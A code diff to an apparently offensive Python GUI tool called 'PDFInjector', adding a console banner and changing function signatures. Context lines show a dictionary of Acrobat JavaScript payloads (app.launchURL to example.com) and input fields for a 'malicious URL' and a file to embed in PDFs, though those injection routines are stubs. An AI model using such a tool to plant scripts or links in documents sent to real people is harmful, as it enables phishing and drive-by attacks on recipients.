@@ -1,5 +1,7 @@
-import os
 import sys
+import os
+import pyfiglet
+from termcolor import colored
 import fitz  # PyMuPDF
 from PySide6.QtWidgets import (
     QApplication, QMainWindow, QVBoxLayout, QLabel, QLineEdit, QPushButton,
@@ -15,6 +17,13 @@ js_payloads = {
     "Open Website": "app.launchURL('https://example.com', true);",
     "Download File": "app.launchURL('https://example.com/secret_document.pdf', true);",
 }
+
+# Display the banner
+def display_banner():
+    ascii_art = pyfiglet.figlet_format("PDFInjector", font="slant")
+    ascii_art_author = pyfiglet.figlet_format("By Kdairatchi", font="digital")
+    print(colored(ascii_art, 'cyan'))
+    print(colored(ascii_art_author, 'magenta'))
 
 class PDFInjector(QMainWindow):
     def __init__(self):
@@ -124,11 +133,11 @@ class PDFInjector(QMainWindow):
         except Exception as e:
             self.show_error_message("An error occurred while injecting JavaScript.", e)
 
-    def _inject_url(self, pdf_reader, pdf_writer, *args):
+    def _inject_url(self, doc):
         malicious_url = self.malicious_url_lineedit.text()
         # Logic for injecting URL goes here
 
-    def _inject_file(self, pdf_reader, pdf_writer, *args):
+    def _inject_file(self, doc):
         file_to_inject = self.file_to_inject_lineedit.text()
         # Logic for injecting file goes here
 
@@ -155,6 +164,7 @@ class PDFInjector(QMainWindow):
         QMessageBox.critical(self, "Error", f"{message}\nDetails: {exception}")
 
 if __name__ == "__main__":
+    display_banner()
     app = QApplication(sys.argv)
     window = PDFInjector()
     window.show()
